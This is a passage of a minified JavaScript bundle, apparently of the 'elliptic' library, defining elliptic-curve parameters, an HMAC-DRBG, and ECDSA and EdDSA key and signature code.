["cee31cbf7e34ec379d94fb814d3d775ad954595d1314ba8846959e3e82f74e26", "8fd64a14c06b589c26b947ae2bcf6bfa0149ef0be14ed4d80f448a01c43b1c6d"], ["b4f9eaea09b6917619f6ea6a4eb5464efddb58fd45b1ebefcdc1a01d08b47986", "39e5c9925b5a54b07433a4f18c61726f8bb131c012ca542eb24a8ac07200682a"], ["d4263dfc3d2df923a0179a48966d30ce84e2515afc3dccc1b77907792ebcc60e", "62dfaf07a0f78feb30e30d6295853ce189e127760ad6cf7fae164e122a208d54"], ["48457524820fa65a4f8d35eb6930857c0032acc0a4a2de422233eeda897612c4", "25a748ab367979d98733c38a1fa1c2e7dc6cc07db2d60a9ae7a76aaa49bd0f77"], ["dfeeef1881101f2cb11644f3a2afdfc2045e19919152923f367a1767c11cceda", "ecfb7056cf1de042f9420bab396793c0c390bde74b4bbdff16a83ae09a9a7517"], ["6d7ef6b17543f8373c573f44e1f389835d89bcbc6062ced36c82df83b8fae859", "cd450ec335438986dfefa10c57fea9bcc521a0959b2d80bbf74b190dca712d10"], ["e75605d59102a5a2684500d3b991f2e3f3c88b93225547035af25af66e04541f", "f5c54754a8f71ee540b9b48728473e314f729ac5308b06938360990e2bfad125"], ["eb98660f4c4dfaa06a2be453d5020bc99a0c2e60abe388457dd43fefb1ed620c", "6cb9a8876d9cb8520609af3add26cd20a0a7cd8a9411131ce85f44100099223e"], ["13e87b027d8514d35939f2e6892b19922154596941888336dc3563e3b8dba942", "fef5a3c68059a6dec5d624114bf1e91aac2b9da568d6abeb2570d55646b8adf1"], ["ee163026e9fd6fe017c38f06a5be6fc125424b371ce2708e7bf4491691e5764a", "1acb250f255dd61c43d94ccc670d0f58f49ae3fa15b96623e5430da0ad6c62b2"], ["b268f5ef9ad51e4d78de3a750c2dc89b1e626d43505867999932e5db33af3d80", "5f310d4b3c99b9ebb19f77d41c1dee018cf0d34fd4191614003e945a1216e423"], ["ff07f3118a9df035e9fad85eb6c7bfe42b02f01ca99ceea3bf7ffdba93c4750d", "438136d603e858a3a5c440c38eccbaddc1d2942114e2eddd4740d098ced1f0d8"], ["8d8b9855c7c052a34146fd20ffb658bea4b9f69e0d825ebec16e8c3ce2b526a1", "cdb559eedc2d79f926baf44fb84ea4d44bcf50fee51d7ceb30e2e7f463036758"], ["52db0b5384dfbf05bfa9d472d7ae26dfe4b851ceca91b1eba54263180da32b63", "c3b997d050ee5d423ebaf66a6db9f57b3180c902875679de924b69d84a7b375"], ["e62f9490d3d51da6395efd24e80919cc7d0f29c3f3fa48c6fff543becbd43352", "6d89ad7ba4876b0b22c2ca280c682862f342c8591f1daf5170e07bfd9ccafa7d"], ["7f30ea2476b399b4957509c88f77d0191afa2ff5cb7b14fd6d8e7d65aaab1193", "ca5ef7d4b231c94c3b15389a5f6311e9daff7bb67b103e9880ef4bff637acaec"], ["5098ff1e1d9f14fb46a210fada6c903fef0fb7b4a1dd1d9ac60a0361800b7a00", "9731141d81fc8f8084d37c6e7542006b3ee1b40d60dfe5362a5b132fd17ddc0"], ["32b78c7de9ee512a72895be6b9cbefa6e2f3c4ccce445c96b9f2c81e2778ad58", "ee1849f513df71e32efc3896ee28260c73bb80547ae2275ba497237794c8753c"], ["e2cb74fddc8e9fbcd076eef2a7c72b0ce37d50f08269dfc074b581550547a4f7", "d3aa2ed71c9dd2247a62df062736eb0baddea9e36122d2be8641abcb005cc4a4"], ["8438447566d4d7bedadc299496ab357426009a35f235cb141be0d99cd10ae3a8", "c4e1020916980a4da5d01ac5e6ad330734ef0d7906631c4f2390426b2edd791f"], ["4162d488b89402039b584c6fc6c308870587d9c46f660b878ab65c82c711d67e", "67163e903236289f776f22c25fb8a3afc1732f2b84b4e95dbda47ae5a0852649"], ["3fad3fa84caf0f34f0f89bfd2dcf54fc175d767aec3e50684f3ba4a4bf5f683d", "cd1bc7cb6cc407bb2f0ca647c718a730cf71872e7d0d2a53fa20efcdfe61826"], ["674f2600a3007a00568c1a7ce05d0816c1fb84bf1370798f1c69532faeb1a86b", "299d21f9413f33b3edf43b257004580b70db57da0b182259e09eecc69e0d38a5"], ["d32f4da54ade74abb81b815ad1fb3b263d82d6c692714bcff87d29bd5ee9f08f", "f9429e738b8e53b968e99016c059707782e14f4535359d582fc416910b3eea87"], ["30e4e670435385556e593657135845d36fbb6931f72b08cb1ed954f1e3ce3ff6", "462f9bce619898638499350113bbc9b10a878d35da70740dc695a559eb88db7b"], ["be2062003c51cc3004682904330e4dee7f3dcd10b01e580bf1971b04d4cad297", "62188bc49d61e5428573d48a74e1c655b1c61090905682a0d5558ed72dccb9bc"], ["93144423ace3451ed29e0fb9ac2af211cb6e84a601df5993c419859fff5df04a", "7c10dfb164c3425f5c71a3f9d7992038f1065224f72bb9d1d902a6d13037b47c"], ["b015f8044f5fcbdcf21ca26d6c34fb8197829205c7b7d2a7cb66418c157b112c", "ab8c1e086d04e813744a655b2df8d5f83b3cdc6faa3088c1d3aea1454e3a1d5f"], ["d5e9e1da649d97d89e4868117a465a3a4f8a18de57a140d36b3f2af341a21b52", "4cb04437f391ed73111a13cc1d4dd0db1693465c2240480d8955e8592f27447a"], ["d3ae41047dd7ca065dbf8ed77b992439983005cd72e16d6f996a5316d36966bb", "bd1aeb21ad22ebb22a10f0303417c6d964f8cdd7df0aca614b10dc14d125ac46"], ["463e2763d885f958fc66cdd22800f0a487197d0a82e377b49f80af87c897b065", "bfefacdb0e5d0fd7df3a311a94de062b26b80c61fbc97508b79992671ef7ca7f"], ["7985fdfd127c0567c6f53ec1bb63ec3158e597c40bfe747c83cddfc910641917", "603c12daf3d9862ef2b25fe1de289aed24ed291e0ec6708703a5bd567f32ed03"], ["74a1ad6b5f76e39db2dd249410eac7f99e74c59cb83d2d0ed5ff1543da7703e9", "cc6157ef18c9c63cd6193d83631bbea0093e0968942e8c33d5737fd790e0db08"], ["30682a50703375f602d416664ba19b7fc9bab42c72747463a71d0896b22f6da3", "553e04f6b018b4fa6c8f39e7f311d3176290d0e0f19ca73f17714d9977a22ff8"], ["9e2158f0d7c0d5f26c3791efefa79597654e7a2b2464f52b1ee6c1347769ef57", "712fcdd1b9053f09003a3481fa7762e9ffd7c8ef35a38509e2fbf2629008373"], ["176e26989a43c9cfeba4029c202538c28172e566e3c4fce7322857f3be327d66", "ed8cc9d04b29eb877d270b4878dc43c19aefd31f4eee09ee7b47834c1fa4b1c3"], ["75d46efea3771e6e68abb89a13ad747ecf1892393dfc4f1b7004788c50374da8", "9852390a99507679fd0b86fd2b39a868d7efc22151346e1a3ca4726586a6bed8"], ["809a20c67d64900ffb698c4c825f6d5f2310fb0451c869345b7319f645605721", "9e994980d9917e22b76b061927fa04143d096ccc54963e6a5ebfa5f3f8e286c1"], ["1b38903a43f7f114ed4500b4eac7083fdefece1cf29c63528d563446f972c180", "4036edc931a60ae889353f77fd53de4a2708b26b6f5da72ad3394119daf408f9"]]
        }
    }),
    secp256k1
}
var hasRequiredCurves;
function requireCurves() {
    return hasRequiredCurves || (hasRequiredCurves = 1,
    function(_) {
        var M = _
          , j = requireHash()
          , O = requireCurve()
          , x = requireUtils$5()
          , w = x.assert;
        function b(F) {
            F.type === "short" ? this.curve = new O.short(F) : F.type === "edwards" ? this.curve = new O.edwards(F) : this.curve = new O.mont(F),
            this.g = this.curve.g,
            this.n = this.curve.n,
            this.hash = F.hash,
            w(this.g.validate(), "Invalid curve"),
            w(this.g.mul(this.n).isInfinity(), "Invalid curve, G*N != O")
        }
        M.PresetCurve = b;
        function X(F, V) {
            Object.defineProperty(M, F, {
                configurable: !0,
                enumerable: !0,
                get: function() {
                    var K = new b(V);
                    return Object.defineProperty(M, F, {
                        configurable: !0,
                        enumerable: !0,
                        value: K
                    }),
                    K
                }
            })
        }
        X("p192", {
            type: "short",
            prime: "p192",
            p: "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff",
            a: "ffffffff ffffffff ffffffff fffffffe ffffffff fffffffc",
            b: "64210519 e59c80e7 0fa7e9ab 72243049 feb8deec c146b9b1",
            n: "ffffffff ffffffff ffffffff 99def836 146bc9b1 b4d22831",
            hash: j.sha256,
            gRed: !1,
            g: ["188da80e b03090f6 7cbf20eb 43a18800 f4ff0afd 82ff1012", "07192b95 ffc8da78 631011ed 6b24cdd5 73f977a1 1e794811"]
        }),
        X("p224", {
            type: "short",
            prime: "p224",
            p: "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001",
            a: "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff fffffffe",
            b: "b4050a85 0c04b3ab f5413256 5044b0b7 d7bfd8ba 270b3943 2355ffb4",
            n: "ffffffff ffffffff ffffffff ffff16a2 e0b8f03e 13dd2945 5c5c2a3d",
            hash: j.sha256,
            gRed: !1,
            g: ["b70e0cbd 6bb4bf7f 321390b9 4a03c1d3 56c21122 343280d6 115c1d21", "bd376388 b5f723fb 4c22dfe6 cd4375a0 5a074764 44d58199 85007e34"]
        }),
        X("p256", {
            type: "short",
            prime: null,
            p: "ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff ffffffff",
            a: "ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff fffffffc",
            b: "5ac635d8 aa3a93e7 b3ebbd55 769886bc 651d06b0 cc53b0f6 3bce3c3e 27d2604b",
            n: "ffffffff 00000000 ffffffff ffffffff bce6faad a7179e84 f3b9cac2 fc632551",
            hash: j.sha256,
            gRed: !1,
            g: ["6b17d1f2 e12c4247 f8bce6e5 63a440f2 77037d81 2deb33a0 f4a13945 d898c296", "4fe342e2 fe1a7f9b 8ee7eb4a 7c0f9e16 2bce3357 6b315ece cbb64068 37bf51f5"]
        }),
        X("p384", {
            type: "short",
            prime: null,
            p: "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 ffffffff",
            a: "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 fffffffc",
            b: "b3312fa7 e23ee7e4 988e056b e3f82d19 181d9c6e fe814112 0314088f 5013875a c656398d 8a2ed19d 2a85c8ed d3ec2aef",
            n: "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff c7634d81 f4372ddf 581a0db2 48b0a77a ecec196a ccc52973",
            hash: j.sha384,
            gRed: !1,
            g: ["aa87ca22 be8b0537 8eb1c71e f320ad74 6e1d3b62 8ba79b98 59f741e0 82542a38 5502f25d bf55296c 3a545e38 72760ab7", "3617de4a 96262c6f 5d9e98bf 9292dc29 f8f41dbd 289a147c e9da3113 b5f0b8c0 0a60b1ce 1d7e819d 7a431d7c 90ea0e5f"]
        }),
        X("p521", {
            type: "short",
            prime: null,
            p: "000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff",
            a: "000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffc",
            b: "00000051 953eb961 8e1c9a1f 929a21a0 b68540ee a2da725b 99b315f3 b8b48991 8ef109e1 56193951 ec7e937b 1652c0bd 3bb1bf07 3573df88 3d2c34f1 ef451fd4 6b503f00",
            n: "000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffa 51868783 bf2f966b 7fcc0148 f709a5d0 3bb5c9b8 899c47ae bb6fb71e 91386409",
            hash: j.sha512,
            gRed: !1,
            g: ["000000c6 858e06b7 0404e9cd 9e3ecb66 2395b442 9c648139 053fb521 f828af60 6b4d3dba a14b5e77 efe75928 fe1dc127 a2ffa8de 3348b3c1 856a429b f97e7e31 c2e5bd66", "00000118 39296a78 9a3bc004 5c8a5fb4 2c7d1bd9 98f54449 579b4468 17afbd17 273e662c 97ee7299 5ef42640 c550b901 3fad0761 353c7086 a272c240 88be9476 9fd16650"]
        }),
        X("curve25519", {
            type: "mont",
            prime: "p25519",
            p: "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed",
            a: "76d06",
            b: "1",
            n: "1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed",
            hash: j.sha256,
            gRed: !1,
            g: ["9"]
        }),
        X("ed25519", {
            type: "edwards",
            prime: "p25519",
            p: "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed",
            a: "-1",
            c: "1",
            d: "52036cee2b6ffe73 8cc740797779e898 00700a4d4141d8ab 75eb4dca135978a3",
            n: "1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed",
            hash: j.sha256,
            gRed: !1,
            g: ["216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a", "6666666666666666666666666666666666666666666666666666666666666658"]
        });
        var Y;
        try {
            Y = requireSecp256k1()
        } catch {
            Y = void 0
        }
        X("secp256k1", {
            type: "short",
            prime: "k256",
            p: "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f",
            a: "0",
            b: "7",
            n: "ffffffff ffffffff ffffffff fffffffe baaedce6 af48a03b bfd25e8c d0364141",
            h: "1",
            hash: j.sha256,
            beta: "7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee",
            lambda: "5363ad4cc05c30e0a5261c028812645a122e22ea20816678df02967c1b23bd72",
            basis: [{
                a: "3086d221a7d46bcde86c90e49284eb15",
                b: "-e4437ed6010e88286f547fa90abfe4c3"
            }, {
                a: "114ca50f7a8e2f3f657c1108d9d44cfd8",
                b: "3086d221a7d46bcde86c90e49284eb15"
            }],
            gRed: !1,
            g: ["79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798", "483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8", Y]
        })
    }(curves)),
    curves
}
var hmacDrbg, hasRequiredHmacDrbg;
function requireHmacDrbg() {
    if (hasRequiredHmacDrbg)
        return hmacDrbg;
    hasRequiredHmacDrbg = 1;
    var _ = requireHash()
      , M = requireUtils$6()
      , j = requireMinimalisticAssert();
    function O(x) {
        if (!(this instanceof O))
            return new O(x);
        this.hash = x.hash,
        this.predResist = !!x.predResist,
        this.outLen = this.hash.outSize,
        this.minEntropy = x.minEntropy || this.hash.hmacStrength,
        this._reseed = null,
        this.reseedInterval = null,
        this.K = null,
        this.V = null;
        var w = M.toArray(x.entropy, x.entropyEnc || "hex")
          , b = M.toArray(x.nonce, x.nonceEnc || "hex")
          , X = M.toArray(x.pers, x.persEnc || "hex");
        j(w.length >= this.minEntropy / 8, "Not enough entropy. Minimum is: " + this.minEntropy + " bits"),
        this._init(w, b, X)
    }
    return hmacDrbg = O,
    O.prototype._init = function(w, b, X) {
        var Y = w.concat(b).concat(X);
        this.K = new Array(this.outLen / 8),
        this.V = new Array(this.outLen / 8);
        for (var F = 0; F < this.V.length; F++)
            this.K[F] = 0,
            this.V[F] = 1;
        this._update(Y),
        this._reseed = 1,
        this.reseedInterval = 281474976710656
    }
    ,
    O.prototype._hmac = function() {
        return new _.hmac(this.hash,this.K)
    }
    ,
    O.prototype._update = function(w) {
        var b = this._hmac().update(this.V).update([0]);
        w && (b = b.update(w)),
        this.K = b.digest(),
        this.V = this._hmac().update(this.V).digest(),
        w && (this.K = this._hmac().update(this.V).update([1]).update(w).digest(),
        this.V = this._hmac().update(this.V).digest())
    }
    ,
    O.prototype.reseed = function(w, b, X, Y) {
        typeof b != "string" && (Y = X,
        X = b,
        b = null),
        w = M.toArray(w, b),
        X = M.toArray(X, Y),
        j(w.length >= this.minEntropy / 8, "Not enough entropy. Minimum is: " + this.minEntropy + " bits"),
        this._update(w.concat(X || [])),
        this._reseed = 1
    }
    ,
    O.prototype.generate = function(w, b, X, Y) {
        if (this._reseed > this.reseedInterval)
            throw new Error("Reseed is required");
        typeof b != "string" && (Y = X,
        X = b,
        b = null),
        X && (X = M.toArray(X, Y || "hex"),
        this._update(X));
        for (var F = []; F.length < w; )
            this.V = this._hmac().update(this.V).digest(),
            F = F.concat(this.V);
        var V = F.slice(0, w);
        return this._update(X),
        this._reseed++,
        M.encode(V, b)
    }
    ,
    hmacDrbg
}
var key$1, hasRequiredKey$1;
function requireKey$1() {
    if (hasRequiredKey$1)
        return key$1;
    hasRequiredKey$1 = 1;
    var _ = requireBn$3()
      , M = requireUtils$5()
      , j = M.assert;
    function O(x, w) {
        this.ec = x,
        this.priv = null,
        this.pub = null,
        w.priv && this._importPrivate(w.priv, w.privEnc),
        w.pub && this._importPublic(w.pub, w.pubEnc)
    }
    return key$1 = O,
    O.fromPublic = function(w, b, X) {
        return b instanceof O ? b : new O(w,{
            pub: b,
            pubEnc: X
        })
    }
    ,
    O.fromPrivate = function(w, b, X) {
        return b instanceof O ? b : new O(w,{
            priv: b,
            privEnc: X
        })
    }
    ,
    O.prototype.validate = function() {
        var w = this.getPublic();
        return w.isInfinity() ? {
            result: !1,
            reason: "Invalid public key"
        } : w.validate() ? w.mul(this.ec.curve.n).isInfinity() ? {
            result: !0,
            reason: null
        } : {
            result: !1,
            reason: "Public key * N != O"
        } : {
            result: !1,
            reason: "Public key is not a point"
        }
    }
    ,
    O.prototype.getPublic = function(w, b) {
        return typeof w == "string" && (b = w,
        w = null),
        this.pub || (this.pub = this.ec.g.mul(this.priv)),
        b ? this.pub.encode(b, w) : this.pub
    }
    ,
    O.prototype.getPrivate = function(w) {
        return w === "hex" ? this.priv.toString(16, 2) : this.priv
    }
    ,
    O.prototype._importPrivate = function(w, b) {
        this.priv = new _(w,b || 16),
        this.priv = this.priv.umod(this.ec.curve.n)
    }
    ,
    O.prototype._importPublic = function(w, b) {
        if (w.x || w.y) {
            this.ec.curve.type === "mont" ? j(w.x, "Need x coordinate") : (this.ec.curve.type === "short" || this.ec.curve.type === "edwards") && j(w.x && w.y, "Need both x and y coordinate"),
            this.pub = this.ec.curve.point(w.x, w.y);
            return
        }
        this.pub = this.ec.curve.decodePoint(w, b)
    }
    ,
    O.prototype.derive = function(w) {
        return w.validate() || j(w.validate(), "public point not validated"),
        w.mul(this.priv).getX()
    }
    ,
    O.prototype.sign = function(w, b, X) {
        return this.ec.sign(w, this, b, X)
    }
    ,
    O.prototype.verify = function(w, b, X) {
        return this.ec.verify(w, b, this, void 0, X)
    }
    ,
    O.prototype.inspect = function() {
        return "<Key priv: " + (this.priv && this.priv.toString(16, 2)) + " pub: " + (this.pub && this.pub.inspect()) + " >"
    }
    ,
    key$1
}
var signature$1, hasRequiredSignature$1;
function requireSignature$1() {
    if (hasRequiredSignature$1)
        return signature$1;
    hasRequiredSignature$1 = 1;
    var _ = requireBn$3()
      , M = requireUtils$5()
      , j = M.assert;
    function O(Y, F) {
        if (Y instanceof O)
            return Y;
        this._importDER(Y, F) || (j(Y.r && Y.s, "Signature without r or s"),
        this.r = new _(Y.r,16),
        this.s = new _(Y.s,16),
        Y.recoveryParam === void 0 ? this.recoveryParam = null : this.recoveryParam = Y.recoveryParam)
    }
    signature$1 = O;
    function x() {
        this.place = 0
    }
    function w(Y, F) {
        var V = Y[F.place++];
        if (!(V & 128))
            return V;
        var K = V & 15;
        if (K === 0 || K > 4 || Y[F.place] === 0)
            return !1;
        for (var Q = 0, ee = 0, ae = F.place; ee < K; ee++,
        ae++)
            Q <<= 8,
            Q |= Y[ae],
            Q >>>= 0;
        return Q <= 127 ? !1 : (F.place = ae,
        Q)
    }
    function b(Y) {
        for (var F = 0, V = Y.length - 1; !Y[F] && !(Y[F + 1] & 128) && F < V; )
            F++;
        return F === 0 ? Y : Y.slice(F)
    }
    O.prototype._importDER = function(F, V) {
        F = M.toArray(F, V);
        var K = new x;
        if (F[K.place++] !== 48)
            return !1;
        var Q = w(F, K);
        if (Q === !1 || Q + K.place !== F.length || F[K.place++] !== 2)
            return !1;
        var ee = w(F, K);
        if (ee === !1 || (F[K.place] & 128) !== 0)
            return !1;
        var ae = F.slice(K.place, ee + K.place);
        if (K.place += ee,
        F[K.place++] !== 2)
            return !1;
        var ne = w(F, K);
        if (ne === !1 || F.length !== ne + K.place || (F[K.place] & 128) !== 0)
            return !1;
        var oe = F.slice(K.place, ne + K.place);
        if (ae[0] === 0)
            if (ae[1] & 128)
                ae = ae.slice(1);
            else
                return !1;
        if (oe[0] === 0)
            if (oe[1] & 128)
                oe = oe.slice(1);
            else
                return !1;
        return this.r = new _(ae),
        this.s = new _(oe),
        this.recoveryParam = null,
        !0
    }
    ;
    function X(Y, F) {
        if (F < 128) {
            Y.push(F);
            return
        }
        var V = 1 + (Math.log(F) / Math.LN2 >>> 3);
        for (Y.push(V | 128); --V; )
            Y.push(F >>> (V << 3) & 255);
        Y.push(F)
    }
    return O.prototype.toDER = function(F) {
        var V = this.r.toArray()
          , K = this.s.toArray();
        for (V[0] & 128 && (V = [0].concat(V)),
        K[0] & 128 && (K = [0].concat(K)),
        V = b(V),
        K = b(K); !K[0] && !(K[1] & 128); )
            K = K.slice(1);
        var Q = [2];
        X(Q, V.length),
        Q = Q.concat(V),
        Q.push(2),
        X(Q, K.length);
        var ee = Q.concat(K)
          , ae = [48];
        return X(ae, ee.length),
        ae = ae.concat(ee),
        M.encode(ae, F)
    }
    ,
    signature$1
}
var ec, hasRequiredEc;
function requireEc() {
    if (hasRequiredEc)
        return ec;
    hasRequiredEc = 1;
    var _ = requireBn$3()
      , M = requireHmacDrbg()
      , j = requireUtils$5()
      , O = requireCurves()
      , x = requireBrorand()
      , w = j.assert
      , b = requireKey$1()
      , X = requireSignature$1();
    function Y(F) {
        if (!(this instanceof Y))
            return new Y(F);
        typeof F == "string" && (w(Object.prototype.hasOwnProperty.call(O, F), "Unknown curve " + F),
        F = O[F]),
        F instanceof O.PresetCurve && (F = {
            curve: F
        }),
        this.curve = F.curve.curve,
        this.n = this.curve.n,
        this.nh = this.n.ushrn(1),
        this.g = this.curve.g,
        this.g = F.curve.g,
        this.g.precompute(F.curve.n.bitLength() + 1),
        this.hash = F.hash || F.curve.hash
    }
    return ec = Y,
    Y.prototype.keyPair = function(V) {
        return new b(this,V)
    }
    ,
    Y.prototype.keyFromPrivate = function(V, K) {
        return b.fromPrivate(this, V, K)
    }
    ,
    Y.prototype.keyFromPublic = function(V, K) {
        return b.fromPublic(this, V, K)
    }
    ,
    Y.prototype.genKeyPair = function(V) {
        V || (V = {});
        for (var K = new M({
            hash: this.hash,
            pers: V.pers,
            persEnc: V.persEnc || "utf8",
            entropy: V.entropy || x(this.hash.hmacStrength),
            entropyEnc: V.entropy && V.entropyEnc || "utf8",
            nonce: this.n.toArray()
        }), Q = this.n.byteLength(), ee = this.n.sub(new _(2)); ; ) {
            var ae = new _(K.generate(Q));
            if (!(ae.cmp(ee) > 0))
                return ae.iaddn(1),
                this.keyFromPrivate(ae)
        }
    }
    ,
    Y.prototype._truncateToN = function(V, K, Q) {
        var ee;
        if (_.isBN(V) || typeof V == "number")
            V = new _(V,16),
            ee = V.byteLength();
        else if (typeof V == "object")
            ee = V.length,
            V = new _(V,16);
        else {
            var ae = V.toString();
            ee = ae.length + 1 >>> 1,
            V = new _(ae,16)
        }
        typeof Q != "number" && (Q = ee * 8);
        var ne = Q - this.n.bitLength();
        return ne > 0 && (V = V.ushrn(ne)),
        !K && V.cmp(this.n) >= 0 ? V.sub(this.n) : V
    }
    ,
    Y.prototype.sign = function(V, K, Q, ee) {
        if (typeof Q == "object" && (ee = Q,
        Q = null),
        ee || (ee = {}),
        typeof V != "string" && typeof V != "number" && !_.isBN(V)) {
            w(typeof V == "object" && V && typeof V.length == "number", "Expected message to be an array-like, a hex string, or a BN instance"),
            w(V.length >>> 0 === V.length);
            for (var ae = 0; ae < V.length; ae++)
                w((V[ae] & 255) === V[ae])
        }
        K = this.keyFromPrivate(K, Q),
        V = this._truncateToN(V, !1, ee.msgBitLength),
        w(!V.isNeg(), "Can not sign a negative message");
        var ne = this.n.byteLength()
          , oe = K.getPrivate().toArray("be", ne)
          , ue = V.toArray("be", ne);
        w(new _(ue).eq(V), "Can not sign message");
        for (var fe = new M({
            hash: this.hash,
            entropy: oe,
            nonce: ue,
            pers: ee.pers,
            persEnc: ee.persEnc || "utf8"
        }), he = this.n.sub(new _(1)), pe = 0; ; pe++) {
            var ye = ee.k ? ee.k(pe) : new _(fe.generate(this.n.byteLength()));
            if (ye = this._truncateToN(ye, !0),
            !(ye.cmpn(1) <= 0 || ye.cmp(he) >= 0)) {
                var be = this.g.mul(ye);
                if (!be.isInfinity()) {
                    var xe = be.getX()
                      , Ae = xe.umod(this.n);
                    if (Ae.cmpn(0) !== 0) {
                        var Ee = ye.invm(this.n).mul(Ae.mul(K.getPrivate()).iadd(V));
                        if (Ee = Ee.umod(this.n),
                        Ee.cmpn(0) !== 0) {
                            var Be = (be.getY().isOdd() ? 1 : 0) | (xe.cmp(Ae) !== 0 ? 2 : 0);
                            return ee.canonical && Ee.cmp(this.nh) > 0 && (Ee = this.n.sub(Ee),
                            Be ^= 1),
                            new X({
                                r: Ae,
                                s: Ee,
                                recoveryParam: Be
                            })
                        }
                    }
                }
            }
        }
    }
    ,
    Y.prototype.verify = function(V, K, Q, ee, ae) {
        ae || (ae = {}),
        V = this._truncateToN(V, !1, ae.msgBitLength),
        Q = this.keyFromPublic(Q, ee),
        K = new X(K,"hex");
        var ne = K.r
          , oe = K.s;
        if (ne.cmpn(1) < 0 || ne.cmp(this.n) >= 0 || oe.cmpn(1) < 0 || oe.cmp(this.n) >= 0)
            return !1;
        var ue = oe.invm(this.n), fe = ue.mul(V).umod(this.n), he = ue.mul(ne).umod(this.n), pe;
        return this.curve._maxwellTrick ? (pe = this.g.jmulAdd(fe, Q.getPublic(), he),
        pe.isInfinity() ? !1 : pe.eqXToP(ne)) : (pe = this.g.mulAdd(fe, Q.getPublic(), he),
        pe.isInfinity() ? !1 : pe.getX().umod(this.n).cmp(ne) === 0)
    }
    ,
    Y.prototype.recoverPubKey = function(F, V, K, Q) {
        w((3 & K) === K, "The recovery param is more than two bits"),
        V = new X(V,Q);
        var ee = this.n
          , ae = new _(F)
          , ne = V.r
          , oe = V.s
          , ue = K & 1
          , fe = K >> 1;
        if (ne.cmp(this.curve.p.umod(this.curve.n)) >= 0 && fe)
            throw new Error("Unable to find sencond key candinate");
        fe ? ne = this.curve.pointFromX(ne.add(this.curve.n), ue) : ne = this.curve.pointFromX(ne, ue);
        var he = V.r.invm(ee)
          , pe = ee.sub(ae).mul(he).umod(ee)
          , ye = oe.mul(he).umod(ee);
        return this.g.mulAdd(pe, ne, ye)
    }
    ,
    Y.prototype.getKeyRecoveryParam = function(F, V, K, Q) {
        if (V = new X(V,Q),
        V.recoveryParam !== null)
            return V.recoveryParam;
        for (var ee = 0; ee < 4; ee++) {
            var ae;
            try {
                ae = this.recoverPubKey(F, V, ee)
            } catch {
                continue
            }
            if (ae.eq(K))
                return ee
        }
        throw new Error("Unable to find valid recovery factor")
    }
    ,
    ec
}
var key, hasRequiredKey;
function requireKey() {
    if (hasRequiredKey)
        return key;
    hasRequiredKey = 1;
    var _ = requireUtils$5()
      , M = _.assert
      , j = _.parseBytes
      , O = _.cachedProperty;
    function x(w, b) {
        this.eddsa = w,
        this._secret = j(b.secret),
        w.isPoint(b.pub) ? this._pub = b.pub : this._pubBytes = j(b.pub)
    }
    return x.fromPublic = function(b, X) {
        return X instanceof x ? X : new x(b,{
            pub: X
        })
    }
    ,
    x.fromSecret = function(b, X) {
        return X instanceof x ? X : new x(b,{
            secret: X
        })
    }
    ,
    x.prototype.secret = function() {
        return this._secret
    }
    ,
    O(x, "pubBytes", function() {
        return this.eddsa.encodePoint(this.pub())
    }),
    O(x, "pub", function() {
        return this._pubBytes ? this.eddsa.decodePoint(this._pubBytes) : this.eddsa.g.mul(this.priv())
    }),
    O(x, "privBytes", function() {
        var b = this.eddsa
          , X = this.hash()
          , Y = b.encodingLength - 1
          , F = X.slice(0, b.encodingLength);
        return F[0] &= 248,
        F[Y] &= 127,
        F[Y] |= 64,
        F
    }),
    O(x, "priv", function() {
        return this.eddsa.decodeInt(this.privBytes())
    }),
    O(x, "hash", function() {
        return this.eddsa.hash().update(this.secret()).digest()
    }),
    O(x, "messagePrefix", function() {
        return this.hash().slice(this.eddsa.encodingLength)
    }),
    x.prototype.sign = function(b) {
        return M(this._secret, "KeyPair can only verify"),
        this.eddsa.sign(b, this)
    }
    ,
    x.prototype.verify = function(b, X) {
        return this.eddsa.verify(b, X, this)
    }
    ,
    x.prototype.getSecret = function(b) {
        return M(this._secret, "KeyPair is public only"),
        _.encode(this.secret(), b)
    }
    ,
    x.prototype.getPublic = function(b) {
        return _.encode(this.pubBytes(), b)
    }
    ,
    key = x,
    key
}
var signature, hasRequiredSignature;
function requireSignature() {
    if (hasRequiredSignature)
        return signature;
    hasRequiredSignature = 1;
    var _ = requireBn$3()
      , M = requireUtils$5()
      , j = M.assert
      , O = M.cachedProperty
      , x = M.parseBytes;
    function w(b, X) {
        this.eddsa = b,
        typeof X != "object" && (X = x(X)),
        Array.isArray(X) && (j(X.length === b.encodingLength * 2, "Signature has invalid size"),
        X = {
            R: X.slice(0, b.encodingLength),
            S: X.slice(b.encodingLength)
        }),
        j(X.R && X.S, "Signature without R or S"),
        b.isPoint(X.R) && (this._R = X.R),
        X.S instanceof _ && (this._S = X.S),
        this._Rencoded = Array.isArray(X.R) ? X.R : X.Rencoded,
        this._Sencoded = Array.isArray(X.S) ? X.S : X.Sencoded
    }
    return O(w, "S", function() {
        return this.eddsa.decodeInt(this.Sencoded())
    }),
    O(w, "R", function() {
        return this.eddsa.decodePoint(this.Rencoded())
    }),
    O(w, "Rencoded", function() {
        return this.eddsa.encodePoint(this.R())
    }),
    O(w, "Sencoded", function() {
